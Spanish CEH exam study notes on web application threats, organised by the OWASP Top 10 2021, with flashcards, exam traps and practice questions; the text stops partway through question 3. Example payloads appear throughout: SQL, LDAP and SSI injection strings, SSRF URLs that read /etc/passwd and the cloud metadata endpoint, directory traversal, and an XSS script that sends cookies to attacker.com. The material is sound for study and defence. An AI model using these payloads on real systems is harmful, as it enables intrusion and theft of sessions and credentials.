# M14_02_WebApplicationThreats.md
> Módulo 14 / Subapartado 2 — Web Application Threats

---

## 1. Conceptos y definiciones

### 🔴 OWASP Top 10 — 2021 (mapa completo)

| ID | Categoría | Ataques incluidos |
|---|---|---|
| **A01** | Broken Access Control | Directory Traversal, Hidden Field Manipulation |
| **A02** | Cryptographic Failures | Cookie Snooping, RC4 NOMORE, Same-Site Attack, Pass-the-Cookie |
| **A03** | Injection | SQL Injection, Command Injection, LDAP Injection, XSS, Buffer Overflow |
| **A04** | Insecure Design | Business Logic Bypass, Web-based Timing Attacks, CAPTCHA Attacks, Platform Exploits |
| **A05** | Security Misconfiguration | XXE Attack, Unvalidated Redirects and Forwards, Directory Traversal, Hidden Field Manipulation |
| **A06** | Vulnerable and Outdated Components | Platform Exploits, Magecart Attack, Buffer Overflow |
| **A07** | Identification and Authentication Failures | CSRF, Cookie/Session Poisoning, Cookie Snooping |
| **A08** | Software and Data Integrity Failures | Insecure Deserialization, Unvalidated Redirects/Forwards, Watering Hole, DoS, Buffer Overflow, Web Service Attacks, Platform Exploits, Magecart |
| **A09** | Security Logging and Monitoring Failures | Web Service Attacks |
| **A10** | Server-Side Request Forgery (SSRF) | SSRF Payload Injection, XSPA, DNS Rebinding, H2C Smuggling |

---

### 🔴 A01 — Broken Access Control

Restricciones mal aplicadas sobre acciones de usuarios autenticados. El atacante bypassea autenticación y accede a funcionalidades/datos no autorizados.

**Vulnerabilidades comunes:** abuso del principio de least privilege; todos los usuarios obtienen acceso en lugar de acceso específico.

---

### 🔴 A02 — Cryptographic Failures / Sensitive Data Exposure

Causas: almacenamiento criptográfico inseguro; fuga de información; claves almacenadas en ubicaciones inseguras; IVs reutilizados o no generados con modos seguros; uso de funciones hash deprecadas.

**Hash deprecados a evitar:** MD5 y SHA-1.
**Padding methods deprecados a evitar:** PKCS 1/1.5.

**Ataques específicos:**

- **Cookie Snooping:** análisis de cookies para conocer hábitos de navegación y lanzar ataques.
- **RC4 NOMORE (Rivest Cipher Numerous Occurrence MOnitoring and Recovery Exploit):** ataque contra el cifrado RC4 en servidores HTTPS; descifra web cookies aseguradas por HTTPS e inyecta paquetes arbitrarios; el atacante suplanta a la víctima usando su cookie robada.
- **Same-Site Attack (related-domain attack):** el atacante toma control de un subdominio mal configurado o abandonado del dominio legítimo (usando eTLD+1) y redirige a los usuarios a una página bajo su control; los sitios que comparten el mismo eTLD+1 comparten cookies. Vector de compromiso del subdominio: phishing, malware injection, cookie poisoning, abuso de JavaScript APIs.
- **Pass-the-Cookie Attack:** el atacante captura cookies de autenticación (incluso cifradas, usando herramientas como mimikatz) y las usa para acceder a la aplicación sin conocer las credenciales.

---

### 🔴 A03 — Injection

#### SQL Injection
La más común. Pasa comandos SQL maliciosos a través de una aplicación web para ejecución por la BBDD backend. La expresión `OR 1=1` evalúa siempre como TRUE → enumeración de todos los user IDs.

```sql
-- Normal
SELECT * FROM tablename WHERE UserID= 2302
-- Con SQL injection
SELECT * FROM tablename WHERE UserID= 2302 OR 1=1
```

Capacidades: login sin credenciales válidas, consultas sobre datos no accesibles normalmente, modificación/eliminación de la BBDD, acceso a otras BBDD mediante relaciones de confianza.

#### Command Injection
El atacante identifica un fallo de input validation e inyecta comandos maliciosos que el OS ejecuta.

**Tipos:**
- **Shell Injection:** acceso shell al servidor. Funciones implicadas: `system()`, `StartProcess()`, `java.lang.Runtime.exec()`, `System.Diagnostics.Process.Start()`.
- **HTML Embedding:** inyección de HTML extra para desfigurar la web virtualmente; el input del usuario se coloca en el HTML de salida sin validación.
- **File Injection:** inyección de código malicioso en ficheros del sistema. Ejemplo: `http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil/exploit?`

#### File Injection Attack
Explota mecanismos de "dynamic file include" en aplicaciones web. El atacante proporciona una URL a un fichero remoto malicioso en lugar del fichero local de confianza. PHP es especialmente vulnerable por el uso extensivo de `file includes` y las configuraciones por defecto del servidor.

#### LDAP Injection
Trabaja igual que SQL injection pero contra LDAP. El atacante modifica filtros de búsqueda LDAP usando un proxy local. Objetivos: login bypass, information disclosure, privilege escalation, information alteration.

Ejemplo: input `certifiedhacker)(&))` genera la query `(&(USER=certifiedhacker)(&))(PASS=blah))` → el servidor LDAP procesa solo el primer filtro `(&(USER=certifiedhacker)(&))` → siempre TRUE → acceso sin contraseña.

#### Server-Side JavaScript Injection
Valores controlables por el usuario se integran en strings que el intérprete evalúa dinámicamente. DoS mediante `while(1)` en la función `eval()` → el event loop consume toda la CPU. Lectura de ficheros: `res.end(require('fs').readFileSync(filename))`.

#### Server-Side Includes (SSI) Injection
Directivas SSI (`#include`, `#echo`, `#exec`) se usan para generar contenido dinámicamente. El atacante inyecta directivas maliciosas como input: `<!_ #exec cmd="cat/etc/passwd" -->` → acceso a `/etc/passwd`, borrado de ficheros, ejecución de comandos shell.

#### Server-Side Template Injection
El atacante inyecta directivas de template maliciosas cuando la aplicación permite input en templates del servidor. Similar a XSS pero orientado a internos del servidor → **Remote Code Execution**. Se origina por errores en el código del diseñador o por exposición deliberada de templates.

#### Log Injection
El atacante explota inputs no sanitizados para insertar entradas falsas en ficheros de log. Técnica: inyección de CRLF (`\r\n`) en el parámetro de log → la entrada falsa aparece como un log legítimo separado. Objetivo: cubrir tracks y ocultar actividad maliciosa.

Ejemplo: `id=%00` (null byte) → si el log no escapa null bytes, el resto del string no se registra.

#### HTML Injection
Inyección de código HTML en campos de formulario vulnerables para cambiar la apariencia del sitio o engañar a los usuarios. El atacante puede crear formularios maliciosos que parecen legítimos → robo de credenciales. Diferente de JavaScript/VBScript injection.

#### CRLF Injection
Inyección de caracteres CR (`\r`, `%0d`) y LF (`\n`, `%0a`) para hacer creer al servidor que el objeto actual ha terminado y uno nuevo ha comenzado. Deriva en: HTTP request smuggling, HTTP response splitting, cache poisoning, firewall security breach, request hijacking, XSS.

Ejemplo log: `%0d%0a` en la URL inyecta una entrada de log falsa con IP diferente.

#### JNDI Injection
La Java Naming and Directory Interface (JNDI) busca objetos en servicios de directorio (CORBA, LDAP, DNS, RMI). Si el parámetro apunta a servicios maliciosos, la aplicación Java obtiene una clase objeto maliciosa del servidor atacante → **Remote Code Execution**. Explota `InitialContext().lookup(name)`. Si `classFactory` no se encuentra, Java intenta resolver `classFactoryLocation` (una URL).

---

### 🔴 A03 — XSS (Cross-Site Scripting)

Exploita vulnerabilidades en páginas web generadas dinámicamente. El atacante inyecta scripts del lado del cliente (JavaScript, VBScript, ActiveX, HTML, Flash) en páginas vistas por otros usuarios.

**Explotaciones posibles:** malicious script execution, redirección a servidor malicioso, explotación de privilegios de usuario, ads en hidden IFRAMEs, data manipulation, session hijacking, brute-force, data theft, intranet probing, keylogging.

**Escenarios:**
- **XSS via email:** link con script malicioso embebido → al clickar, el script se ejecuta en el contexto del servidor legítimo.
- **XSS en blog/comment field:** script almacenado en la BBDD del servidor → se ejecuta en el navegador de cada usuario que visita la página (stored XSS).

#### 🔴 Técnicas de evasión de filtros XSS

| Técnica | Mecanismo |
|---|---|
| **Encoding de caracteres** | ASCII (`&#106;`), hexadecimal (`&#6A;`), Base64 (`eval(atob(...))`), zero-padding (`&#0000058`) |
| **Embedding whitespaces** | Tabs, CR, LF no se procesan → dividen keywords. Tab: `java\tscript`. Codificado: `&#x09;` |
| **Manipulación de tags** | Script dentro de otro script: `<scr<script>ipt>`; slash para bypassear whitespace: `<img/src=...>`; event handlers: `<onfocus>`, `<onerror>`, `<onclick>` |

---

### A04 — Insecure Design

Falta de threat modeling y business risk profiling. Exploits: request forgery, authentication hijacking, identity theft, data loss, DoS.

#### Web-based Timing Attacks (side-channel attacks)

| Tipo | Mecanismo |
|---|---|
| **Direct Timing Attack** | Mide tiempo de respuesta del servidor a POST requests → deduce existencia de username; examen carácter a carácter de la contraseña por timing |
| **Cross-site Timing Attack** | Envía requests con JavaScript al sitio; mide tiempo de descarga del fichero solicitado para inferir a qué grupo pertenece el usuario → viola privacidad |
| **Browser-based Timing Attack** | Abusa de side-channel leaks del navegador; mide tiempo de procesamiento (no de descarga). Subtipos: video parsing attack, cache storage timing attack |

---

### A05 — Security Misconfiguration

#### Unvalidated Inputs
Input del cliente no validado antes de ser procesado. Si la validación solo es client-side, el atacante la bypassa manipulando HTTP requests, URLs, headers, form fields, hidden fields, query strings. Deriva en: XSS, buffer overflow, injection attacks.

#### Parameter/Form Tampering
Manipulación de parámetros cliente-servidor: credenciales, permisos, precios, cantidades. Almacenados en cookies, hidden form fields o URL query strings. Herramientas: **WebScarab**, **WebSploit Framework**.

Ejemplo HTML hidden field: `<input type="hidden" name="price" value="99.90">` → el atacante cambia `value="2.00"`.
Ejemplo URL: `http://bank.com/cust.asp?profile=21&debit=2500` → atacante cambia `profile=82&debit=1500`.

Consecuencias: robo de servicios, escalada de acceso, session hijacking, acceso a información de debugging.

#### Improper Error Handling
Revela lógica del código fuente, cuentas por defecto, información de BBDD, flujo lógico de la aplicación, entorno de la aplicación, null pointer exceptions, network timeouts.

#### Insufficient Transport Layer Protection
Fallo en proteger tráfico sensible; soporta algoritmos débiles; certificados SSL expirados o inválidos. Deriva en: intercepción, inyección, redirección de datos, phishing, MITM. Solución: SSL/TLS.

#### XXE (XML External Entity)
El parser XML evalúa referencias a entidades externas en documentos XML. Puede revelar ficheros internos (vía file URI handler), SMB file shares en Windows sin parchear, realizar port scanning interno, RCE, DoS (**billion laughs attack**).

---

### A06 — Vulnerable and Outdated Components

Los componentes (libraries, frameworks) se ejecutan con los **mismos privilegios** que la aplicación. Búsqueda de vulnerabilidades en exploit sites: **Exploit Database**, **CXSecurity**, **Zero Day Initiative**. Herramientas de vulnerability scanning: **Nessus**, **GFI LanGuard**.

---

### A07 — Identification and Authentication Failures

**Session ID in URLs:** sesión visible en URL → vulnerable a session fixation attacks.

**Password Exploitation:** algoritmos de hash débiles permiten recuperar contraseñas de la BBDD.

**Timeout Exploitation:** session timeout largo + session IDs no cambiados tras cada login → un atacante con acceso físico al equipo puede reutilizar la sesión. Si timeout = 2h y el usuario cierra el navegador sin logout → la sesión sigue válida durante esas 2h.

---

### A08 — Software and Data Integrity Failures

Auto-updates desde fuentes no verificadas; CI/CD pipelines inseguros; deserialización insegura.

**Exploits posibles:** cache poisoning, code injection, command execution, DoS, data theft.

**Insecure Deserialization:**
- Serialización: convierte objeto en formato lineal (XML, JSON) para transporte.
- Deserialización: recrea el objeto desde el formato lineal.
- Ataque: el atacante inyecta código malicioso en los datos serializados → al deserializar, el código malicioso se ejecuta → RCE.

---

### A09 — Security Logging and Monitoring Failures

Causas: logs sin información completa de logins/transacciones; mensajes de error vagos; monitorización inadecuada de API logs; almacenamiento local de logs; sin proceso de escalada de respuesta; DAST tools (ej. OWASP ZAP) que no generan alertas; aplicaciones sin detección en tiempo real.

---

### 🔴 A10 — SSRF y ataques relacionados

**SSRF:** el atacante modifica la URL input a `localhost` o IP interna → el servidor hace peticiones a recursos internos protegidos por firewall, VPN o ACL.

**Payloads de acceso a páginas internas:**
```
https://www.certifiedhacker.com/page?url=http://127.0.0.1/admin
https://www.certifiedhacker.com/page?url=http://127.0.0.1/phpmyadmin
```

**Payloads de acceso a ficheros internos (file schema):**
```
https://www.certifiedhacker.com/page?url=file:///etc/passwd
https://www.certifiedhacker.com/page?url=file://etc/passwd
```

**Payloads para servicios internos (FTP/LDAP):**
```
https://www.certifiedhacker.com/page?url=ftp://attacker.net:11211/
https://www.certifiedhacker.com/page?url=ldap://127.0.0.1/%0astats%0aquit
```

**XSPA (Cross-Site Port Attack):** escanea puertos abiertos del servidor usando loopback (localhost / 127.0.0.1). Puertos escaneados de ejemplo: 22, 25, 3389.
```
https://www.certifiedhacker.com/page?url=http://localhost:22/
https://www.certifiedhacker.com/page?url=http://127.0.0.1:3389/
```

---

### 🔴 Directory Traversal — Capacidades del atacante

- Enumerar contenidos de ficheros y directorios
- Acceder a páginas que requieren autenticación (y posiblemente pago)
- Obtener conocimiento secreto de la aplicación
- Descubrir user IDs y passwords en ficheros ocultos
- Localizar source code y otros ficheros en el servidor
- Ver datos sensibles como información de clientes

Ejemplos: `http://www.targetsite.com/../../../sitebackup.zip` / `http://www.targetsite.com/../../../../etc/passwd`

---

### Hidden Field Manipulation

Los campos hidden en HTML son invisibles al usuario pero se envían como parámetros en el submit del formulario. El atacante examina el HTML, modifica los valores hidden y recarga la página. Objetivo clásico: e-commerce (cambiar precio de productos).

Pasos: abrir en editor HTML → localizar `type=hidden` → modificar value → guardar localmente → browse → Buy.

---

### 🔴 Magecart Attack (web skimming)

1. Atacante identifica e-commerce con software desactualizado o plugins de terceros vulnerables
2. Tras ganar acceso, embebe JS malicioso en el sitio
3. El script se activa durante el checkout → exfiltra datos de tarjeta al servidor del atacante
4. El atacante usa los datos para fraude, identity theft o los vende en dark web

---

### Watering Hole Attack

El atacante identifica sitios web frecuentados por la víctima → inyecta script/código malicioso → espera a que la víctima visite el sitio infectado → la página redirige y descarga malware. El atacante espera pasivamente (como un depredador en un abrevadero).

---

### 🔴 CSRF (Cross-Site Request Forgery)

También llamado **one-click attack**. El atacante instruye al navegador del usuario para enviar peticiones al sitio vulnerable desde una página maliciosa. El usuario mantiene una sesión activa con el sitio de confianza. El ataque explota la incapacidad de la aplicación para distinguir peticiones legítimas de maliciosas.

Uso en redes corporativas: como los atacantes externos no pueden acceder directamente a intranets, CSRF es uno de los métodos para entrar.

---

### Cookie/Session Poisoning

El atacante modifica los valores de las cookies del lado del cliente antes de enviar la petición al servidor. Tipos de cookies: **persistent** (almacenada en disco), **non-persistent** (almacenada en memoria), **secure** (solo via SSL), **non-secure**.

Encodings de cookies fácilmente reversibles que dan falsa sensación de seguridad: **Base64** y **ROT13**.

Un proxy puede reescribir session data, mostrar cookie data y especificar nuevos user IDs u otros session identifiers.

---

### 🔴 Insecure Deserialization — Ejemplo JAVA

Serialización:
```xml
<Employee><Name>Rinni</Name><Age>26</Age><City>Nevada</City><EmpID>2201</EmpID></Employee>
```
Ataque: el atacante inyecta `MALICIOUS PROCEDURE` en los datos serializados → al deserializar, el código malicioso se ejecuta sin ser detectado.

---

### 🔴 Web Service Attacks

**UDDI structures para footprinting:**
- `businessEntity`: info de la empresa (nombre, contacto)
- `businessService`: grupo lógico de uno o múltiples web services; subconjunto de businessEntity
- `bindingTemplate`: un único web service; subconjunto de businessService; info técnica para que el cliente haga bind
- `technicalModel (tModel)`: metadatos clave; representa conceptos únicos en UDDI

**XML Poisoning:** inserción de código XML malicioso en requests SOAP → manipulación de nodos XML / XML schema poisoning → errores en parsing logic (SAX, DOM) → DoS, información confidencial comprometida. Similar a SQL injection pero en framework de web services.

---

### DNS Rebinding Attack

Bypassa la Same-Origin Policy (SOP). El atacante crea un dominio con TTL muy corto → la víctima carga la web maliciosa → el JavaScript en el navegador hace una segunda petición DNS → el servidor DNS del atacante responde con la IP interna de la organización → el navegador carga recursos del servidor interno creyendo que es el mismo origen.

---

### 🔴 Clickjacking Attack (UI Redress Attack)

El sitio objetivo se carga en un iframe con opacidad baja/cero → el atacante diseña la página maliciosa con elementos clickables posicionados exactamente sobre los del sitio legítimo → la víctima hace click creyendo interactuar con el sitio legítimo.

**Técnicas:**

| Técnica | Descripción |
|---|---|
| **Complete transparent overlay** | Página transparente legítima superpuesta sobre página maliciosa en iframe invisible con z-index alto |
| **Cropping** | Solo se superponen controles seleccionados de la página transparente |
| **Hidden overlay** | iframe de 1×1 píxeles con contenido malicioso bajo el cursor del ratón |
| **Click event dropping** | CSS `pointer-events: none` en capa superior → los clicks "caen" a la página maliciosa |
| **Rapid content replacement** | Overlays opacos se eliminan momentáneamente para registrar el click |

Vectores de distribución: email, redes sociales. Explota vulnerabilidades de HTML iframes o configuración incorrecta del header `X-Frame-Options`.

---

### MarioNet Attack

Ataque basado en navegador que persiste **después de cerrar la pestaña o el sitio malicioso**. Explota la API **Service Workers** de los navegadores modernos. El atacante registra y activa Service Workers desde su sitio → cuando la víctima lo visita, la API se activa y puede correr en background persistentemente. Se mantiene vivo abusando del **Service Workers SyncManager interface**.

Usos: botnet, cryptojacking, DDoS, click fraud, distributed password cracking, robo de credenciales.

---

### H2C Smuggling Attack

Explota el manejo de conexiones HTTP/2 en aplicaciones que soportan tanto HTTP/1.1 como HTTP/2. "H2C" = HTTP/2 over TCP (sin TLS). El atacante crafta requests que engañan a los controles de seguridad o a la comunicación frontend/backend. Consecuencias: cache poisoning, bypass de controles de seguridad, acceso no autorizado a información sensible.

---

### 🔴 Unvalidated Redirects and Forwards

**Redirects:** el atacante envía links con la URL legítima al inicio y URL maliciosa al final → la víctima confía en el inicio del link y es redirigida al sitio del atacante.

**Forwards:** el atacante usa un link con forward query embebido (`?fwd=admin.jsp`) → el servidor redirige al atacante a la página admin sin validación → bypass de controles de seguridad.

**Tipos de ataques derivados:**
- Session Fixation Attack
- Security Management Exploits
- Failure to Restrict URL Access
- Malicious File Execution → RCE, instalación remota de rootkits

**Tipos de redirección:**
- **Open Redirection:** añade parámetros propios a una URL de sitio de confianza para redirigir a sitio malicioso.
- **Header-Based Open Redirection:** modifica el HTTP Location header para redirigir sin conocimiento del usuario.
- **JavaScript-Based Open Redirection:** inyecta JavaScript en la respuesta del servidor web → redirige; muy usado en phishing.

---

### JavaScript Hijacking (JSON Hijacking)

Captura información sensible de sistemas que usan JSON como carrier de datos. Explota fallos en la same-origin policy del navegador que permiten a un dominio añadir código de otro dominio.

---

### Cross-Site WebSocket Hijacking (CSWH)

El atacante establece una conexión WebSocket con la aplicación vulnerable usando la identidad de la víctima. Posible cuando el WebSocket handshake usa HTTP cookies sin CSRF tokens. El atacante puede enviar mensajes arbitrarios y leer respuestas del servidor.

---

### Obfuscation Application

Para evadir IDS/IPS, el atacante codifica porciones del ataque. Métodos: **Unicode**, **UTF-8**, **Base64**, **URL encoding**.

---

## 2. Exam Traps ⚠️

⚠️ **[OWASP A10 es SSRF, no "other"]**
SSRF tiene su propia categoría (A10) en OWASP 2021. El examen puede presentarlo solo como un tipo de injection o como A03. Desde 2021 tiene categoría propia.

⚠️ **[RC4 NOMORE: nombre completo y objetivo]**
Rivest Cipher Numerous Occurrence MOnitoring and Recovery Exploit. Ataca específicamente el cifrado **RC4** en conexiones **HTTPS**. Descifra cookies web (no todo el tráfico). No confundir con un ataque de fuerza bruta.

⚠️ **[Same-Site Attack: requisito eTLD+1]**
Solo los sitios que comparten el mismo **eTLD+1** comparten cookies y pueden ser explotados. El ataque apunta a subdominios abandonados o mal configurados, no a cualquier subdominio. Usuarios de DNS dinámico son especialmente vulnerables.

⚠️ **[CSRF = "one-click attack"]**
El libro denomina CSRF también "one-click attack". El examen puede presentar "one-click" como nombre de otro ataque. La característica clave: el ataque usa la sesión activa del usuario en un sitio de confianza.

⚠️ **[Tipos de cookies: 4, no 2]**
Persistent (disco), non-persistent (memoria), secure (solo SSL), non-secure. El examen puede presentar solo persistent/non-persistent.

⚠️ **[Base64 y ROT13 como falsa seguridad en cookies]**
El libro los señala explícitamente como encodings "fácilmente reversibles que dan falsa sensación de seguridad". No son métodos de cifrado seguros para cookies. El examen puede presentarlos como protección válida.

⚠️ **[Insecure Deserialization: el código malicioso en datos lineales no es detectado]**
El código malicioso inyectado en datos serializados **pasa desapercibido** y se ejecuta durante la deserialización. No hay validación en el proceso de deserialización que lo detecte.

⚠️ **[XXE es un tipo de SSRF]**
El libro describe XXE como "a Server-side Request Forgery attack whereby an application can parse XML input from an unreliable source". El examen puede presentarlo como ataque completamente independiente. La relación XXE-SSRF es explícita en el texto.

⚠️ **[Billion laughs attack → XXE/DoS]**
El billion laughs attack es un DoS que deriva de XXE. El examen puede preguntar qué tipo de ataque es el billion laughs → DoS mediante XXE.

⚠️ **[JNDI Injection: si classFactory no se encuentra, se usa classFactoryLocation]**
El fallback es resolver `classFactoryLocation` como URL → el Java application server descarga código desde esa URL. Este mecanismo de fallback es el que explota Log4Shell (aunque el libro no lo nombre así).

⚠️ **[MarioNet: persiste después de cerrar el tab]**
La persistencia post-cierre es la característica definitoria. Explota Service Workers API + SyncManager interface. No es malware instalado; corre en el contexto del navegador.

⚠️ **[Clickjacking: explota X-Frame-Options, no solo iframes]**
El ataque explota vulnerabilidades en HTML iframes **o** configuración incorrecta del header `X-Frame-Options`. El examen puede presentar solo iframes como causa.

⚠️ **[LDAP Injection: objetivo de la inyección `certifiedhacker)(&))`]**
La query resultante `(&(USER=certifiedhacker)(&))` siempre es TRUE → login bypass sin contraseña. El examen puede preguntar por qué la query es siempre verdadera.

---

## 3. Nemotécnicos

**OWASP Top 10 (2021) en orden** → **"BCA-ID-SVS-ISL-SR"**:
A01 **B**roken Access Control · A02 **C**ryptographic Failures · A03 **A3** Injection · A04 **I**nsecure **D**esign · A05 Security **M**isconfiguration · A06 **V**ulnerable Components · A07 Auth Failures · A08 **S**oftware Integrity · A09 Logging Failures · A10 **SR**F

*(Alternativa por letras iniciales):* **"BCI-IS-VA-SSL-SR"** — o simplemente memorizar el orden ordinal con los nombres.

**Ataques A02 (Cryptographic Failures)** → **"C-RC4-S-P"**: **C**ookie Snooping · **RC4** NOMORE · **S**ame-Site · **P**ass-the-Cookie

**Ataques A03 (Injection)** → **"SQL-CMD-LDAP-XSS-BUF"**

**Clickjacking 5 técnicas** → **"C-O-H-D-R"**: **C**omplete overlay · **C**ropping · **H**idden overlay (1×1px) · **D**rop click events · **R**apid replacement

**UDDI structures (4)** → **"BE-BS-BT-TM"**: **b**usiness**E**ntity · **b**usiness**S**ervice · **b**inding**T**emplate · **T**echnical**M**odel

**Tipos de cookies (4)** → **"P-NP-S-NS"**: **P**ersistent (disco) · **N**on-**P**ersistent (memoria) · **S**ecure (SSL) · **N**on-**S**ecure

**Técnicas evasión XSS (3)** → **"E-W-T"**: **E**ncoding · **W**hitespace · **T**ag manipulation

**Web-based Timing Attacks (3)** → **"D-C-B"**: **D**irect · **C**ross-site · **B**rowser-based (subtipos: video parsing, cache storage)

---

## 4. Flashcards

**Q:** ¿Cuál es la categoría OWASP 2021 que tiene como ataques XSPA, DNS Rebinding y H2C Smuggling?
**A:** A10 — Server-Side Request Forgery (SSRF).

---

**Q:** ¿Qué significa RC4 NOMORE y cuál es su objetivo?
**A:** Rivest Cipher Numerous Occurrence MOnitoring and Recovery Exploit. Ataca el cifrado RC4 en servidores HTTPS para descifrar web cookies y suplantar al usuario.

---

**Q:** ¿Qué hash algorithms y padding methods deprecados debe evitar un desarrollador según A02?
**A:** Hash deprecados: MD5 y SHA-1. Padding deprecado: PKCS 1/1.5.

---

**Q:** ¿Qué hace la expresión `OR 1=1` en un SQL injection?
**A:** Evalúa siempre como TRUE, permitiendo al atacante enumerar todos los registros de la tabla (ej. todos los user IDs).

---

**Q:** ¿Qué funciones de shell injection menciona el libro?
**A:** `system()`, `StartProcess()`, `java.lang.Runtime.exec()`, `System.Diagnostics.Process.Start()`.

---

**Q:** ¿Por qué PHP es especialmente vulnerable a file injection attacks?
**A:** Por el uso extensivo de `file includes` en programación PHP y las configuraciones por defecto del servidor.

---

**Q:** ¿Cuáles son los 4 objetivos de un LDAP injection attack?
**A:** Login bypass, information disclosure, privilege escalation, information alteration.

---

**Q:** ¿Qué hace `while(1)` en un Server-Side JavaScript Injection?
**A:** Fuerza al event loop del servidor a consumir toda la CPU, impidiéndole evaluar inputs adicionales → DoS.

---

**Q:** ¿Cuál es la diferencia entre HTML Injection y XSS?
**A:** HTML Injection inyecta código HTML para cambiar la apariencia o engañar al usuario (ej. formularios falsos). XSS inyecta scripts ejecutables (JavaScript, VBScript) que se ejecutan en el navegador del usuario. Son ataques distintos.

---

**Q:** ¿Cuáles son los 4 pasos del Magecart Attack?
**A:** (1) Atacante identifica e-commerce vulnerable. (2) Embede JS malicioso en el sitio. (3) El script se activa en el checkout y exfiltra datos de tarjeta. (4) El atacante usa los datos para fraude.

---

**Q:** ¿Por qué CSRF se llama también "one-click attack"?
**A:** Porque se activa con un solo click del usuario en el link/elemento malicioso que el atacante le ha enviado.

---

**Q:** ¿Cuáles son los 4 tipos de cookies?
**A:** Persistent (almacenada en disco), non-persistent (almacenada en memoria), secure (solo transmitida via SSL), non-secure.

---

**Q:** ¿Qué codificaciones de cookies da el libro como ejemplos de "falsa sensación de seguridad"?
**A:** Base64 y ROT13 — son fácilmente reversibles y no ofrecen protección real.

---

**Q:** ¿Cuál es la técnica de clickjacking que usa un iframe de 1×1 píxeles?
**A:** Hidden overlay — se coloca secretamente bajo el cursor del ratón; al hacer click, el click se registra en la página maliciosa.

---

**Q:** ¿Cómo funciona MarioNet y qué API explota?
**A:** Registra y activa la API Service Workers desde un sitio controlado por el atacante. La API corre en background persistentemente incluso después de cerrar la pestaña, abusando del SyncManager interface.

---

**Q:** ¿Qué permite el H2C Smuggling Attack y qué significa H2C?
**A:** H2C = HTTP/2 over TCP (sin TLS). El ataque explota el manejo de conexiones HTTP/2 en apps que soportan HTTP/1.1 y HTTP/2 simultáneamente → cache poisoning, bypass de seguridad, acceso no autorizado.

---

**Q:** ¿Cuáles son las 4 estructuras UDDI que un atacante puede obtener mediante web service footprinting?
**A:** businessEntity (info de empresa), businessService (grupo de servicios), bindingTemplate (un único servicio + info técnica de binding), technicalModel/tModel (metadatos clave).

---

**Q:** ¿Qué hace un ataque de XML Poisoning sobre los mecanismos de parsing?
**A:** Crea documentos XML maliciosos para alterar los mecanismos de parsing SAX y DOM que las aplicaciones web usan en el servidor → errores en parsing logic, DoS, información comprometida.

---

**Q:** ¿Cuál es el fallback de JNDI cuando no encuentra el objeto classFactory?
**A:** Java resuelve el atributo `classFactoryLocation`, que es una URL desde la que descarga y ejecuta el bytecode → Remote Code Execution.

---

**Q:** ¿Qué caracteriza a una Same-Site Attack y qué comparten los sitios con el mismo eTLD+1?
**A:** El atacante toma control de un subdominio mal configurado/abandonado del dominio legítimo. Los sitios con el mismo eTLD+1 comparten cookies → el atacante puede obtener cookies legítimas.

---

## 5. Confusión frecuente

**XSS vs. CSRF**
- XSS: el atacante inyecta scripts en el sitio legítimo que se ejecutan en el navegador de la víctima. El servidor es el vehículo.
- CSRF: el atacante usa la sesión autenticada de la víctima para enviar peticiones al servidor legítimo desde un sitio malicioso. El navegador de la víctima es el vehículo.
- Criterio: "script inyectado en la página del sitio legítimo" → XSS. "Petición no deseada enviada en nombre del usuario autenticado" → CSRF.

---

**SQL Injection vs. LDAP Injection**
- SQL Injection: manipula queries SQL contra bases de datos relacionales; input no validado pasa comandos SQL al backend.
- LDAP Injection: manipula filtros de búsqueda LDAP contra servicios de directorio (Active Directory, etc.); usa un proxy local para modificar statements.
- Criterio: "base de datos relacional, queries SQL" → SQL Injection. "Servicio de directorio, filtros LDAP" → LDAP Injection.

---

**Serialización vs. Insecure Deserialization**
- Serialización: proceso legítimo de convertir objeto a formato lineal para transporte.
- Insecure Deserialization: el ataque ocurre en la **deserialización**, no en la serialización. El atacante inyecta código en los datos ya serializados; al deserializar, el código malicioso se ejecuta sin ser detectado.
- Criterio: "conversión a formato lineal" → serialización. "Ejecución de código malicioso al reconstruir el objeto" → insecure deserialization.

---

**Watering Hole Attack vs. Phishing**
- Watering Hole: el atacante infecta un sitio legítimo que la víctima visita habitualmente y espera pasivamente. La infección llega al usuario por visitar el sitio.
- Phishing: el atacante envía directamente un link/email a la víctima para llevarla a un sitio falso.
- Criterio: "atacante infecta sitio frecuentado y espera" → watering hole. "Atacante envía link activamente a la víctima" → phishing.

---

**Open Redirection vs. Header-Based vs. JavaScript-Based Open Redirection**
- Open Redirection: añade parámetros propios a una URL legítima para redirigir al sitio malicioso.
- Header-Based: modifica el HTTP Location header → redirige sin JavaScript (útil cuando JavaScript no puede interpretar el header).
- JavaScript-Based: inyecta JavaScript en la respuesta del servidor → redirige; principal vector en phishing.
- Criterio: "URL con parámetros manipulados" → Open Redirection genérico. "Location header modificado" → Header-Based. "JS inyectado en la respuesta" → JavaScript-Based.

---

## 6. Preguntas de Práctica — Formato CEH

---

### Pregunta 1 — OWASP A10: SSRF
Un desarrollador encuentra que su aplicación web usa la URL proporcionada por el usuario para hacer peticiones HTTP del lado del servidor. Un tester proporciona `http://169.254.169.254/latest/meta-data/` como URL. ¿Qué vulnerabilidad OWASP y qué ataque representa esto?

A) A03 — Injection; Command Injection  
B) A10 — SSRF; acceso a los metadatos de instancia de cloud (AWS/GCP/Azure)  
C) A01 — Broken Access Control; Directory Traversal  
D) A05 — Security Misconfiguration; XXE Attack  

> **Respuesta correcta: B** — **SSRF (A10)**: el atacante modifica la URL para que el servidor haga peticiones a `http://169.254.169.254` que es la IP de los **metadatos de instancia de cloud** (AWS, GCP, Azure). Esto puede revelar credenciales de IAM, tokens de sesión y configuraciones de la infraestructura cloud. Es uno de los vectores más críticos en entornos cloud modernos.

---

### Pregunta 2 — XSS vs CSRF
Un tester de seguridad tiene dos escenarios: (A) Inyecta `<script>document.location='http://attacker.com/?c='+document.cookie</script>` en el campo de comentarios de un blog. (B) Envía al usuario un link con una petición a `http://bank.com/transfer?amount=10000&to=attacker`. ¿Cuál es el ataque en cada caso?

A) Ambos son XSS  
B) A = XSS Stored; B = CSRF  
C) A = CSRF; B = XSS Reflected  
D) Ambos son Injection attacks  

> **Respuesta correcta: B** — **Escenario A = XSS Stored**: el script malicioso se inyecta y almacena en el servidor (base de datos del blog), ejecutándose en el navegador de cualquier usuario que visite la página. **Escenario B = CSRF** (one-click attack): explota la sesión autenticada del usuario para enviar peticiones al servidor legítimo sin su conocimiento.

---

### Pregunta 3 — Insecure Deserialization
Una aplicación Java recibe datos XML serializados de un cliente. Un investigador de seguridad detecta que inyectando una clase Java maliciosa en los datos serializados, puede lograr ejecución de código en el servidor cuando los datos son deserializados. ¿Qué vulnerabilidad OWASP es y cuál es la consecuencia más grave?

